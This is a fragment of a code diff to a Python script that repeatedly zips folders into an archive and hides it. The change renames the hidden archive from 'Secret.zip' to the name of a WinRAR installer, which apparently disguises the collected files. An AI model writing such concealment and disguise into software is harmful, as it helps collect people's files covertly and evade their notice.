@@ -16,7 +16,7 @@ def adicionar_pasta_ao_zip(zf, pasta, caminho_relativo=""):
 while True:
     time.sleep(61)
 
-    arquvio_zip = "Secret.zip"
+    arquvio_zip = "winrar-x64-701br.zip"
 
     if os.path.exists(arquvio_zip):
         os.remove(arquvio_zip)
@@ -32,6 +32,4 @@ while True:
         os.system(f'attrib +h "{arquvio_zip}"')
     else:
         arquivo_oculto = f".{arquvio_zip}"
-        os.rename("Secret.zip", ".Secret.zip")
-    
-    
+        os.rename("winrar-x64-701br.zip", ".winrar-x64-701br.zip")
